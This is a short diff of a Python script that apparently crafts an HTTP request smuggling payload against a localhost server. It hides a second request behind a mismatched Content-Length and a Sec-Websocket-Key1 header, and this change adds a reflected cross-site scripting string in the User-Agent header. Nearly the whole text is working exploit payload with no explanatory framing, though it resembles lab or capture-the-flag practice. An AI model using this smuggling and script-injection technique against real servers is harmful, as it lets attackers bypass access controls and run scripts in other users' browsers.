@@ -1,5 +1,6 @@
 import socket
 import sys
+import time
 
 SERVER = "127.0.0.1"
 PORT = 80
@@ -7,11 +8,12 @@ PORT = 80
 PAYLOAD = (
     b"GET / HTTP/1.1\r\n" +
     b"Host: localhost\r\n" +
-    b"Content-Length: 54\r\n" +
+    b"Content-Length: 107\r\n" +
     b"Sec-Websocket-Key1: x\r\n" + 
     b"\r\n" +
-    b"xxxxxxxxGET /protected HTTP/1.1\r\n" +
-    b"Host: localhost\r\n" +                
+    b"xxxxxxxxGET /reflected HTTP/1.1\r\n" +
+    b"Host: localhost\r\n" +  
+    b"User-Agent: <script>alert(document.domain)</script>\r\n" +  
     b"X: x"
 )
 
